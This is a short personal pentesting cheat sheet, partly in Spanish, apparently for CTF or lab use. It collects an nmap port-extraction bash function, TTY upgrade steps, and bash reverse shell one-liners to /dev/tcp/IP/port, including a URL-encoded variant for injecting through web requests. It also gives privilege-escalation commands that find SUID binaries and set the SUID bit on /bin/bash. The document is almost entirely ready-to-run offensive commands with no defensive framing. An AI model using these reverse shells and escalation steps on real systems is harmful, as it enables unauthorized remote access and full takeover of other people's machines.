# Acordeon

## S4vitar extractports


```bash

# Used: 
# nmap -p- --open -T5 -v -n ip -oG allPorts

# Extract nmap information
# Run as: 
# extractPorts allPorts
function extractPorts(){
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
	ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address"  >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n"  >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
	cat extractPorts.tmp; rm extractPorts.tmp
}
```

## Fully TTYs

```bash

script /dev/null -c bash
CTRL+Z
stty -echo raw;fg
    reset
export TERM=xterm
export SHELL=bash
stty rows  51 columns 189
```

## Python Fully TTY

> https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys

````python 

python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
````






## Spawn shells

Recuerda cuando estes en una web e intentes ejecutar una reverse shell. Cambia el & por %26 

```bash

bash -c "bash -i >%26 /dev/tcp/IP/port 0>%261"
bash -c "bash -i >& /dev/tcp/IP/port 0>&1"

```

## Sudo

```
sudo -u asuser whoami

```


## Enum

```
lsb_release -a
systemctl-timers
watch -n 1 ls -l /bin/bash # ver cada segundo ese comando
```

## Find

```
find \-perm -4000 2>/dev/null

```

## SUID

```python

import os

os.system("chmod u+s /bin/bash")

```


















































































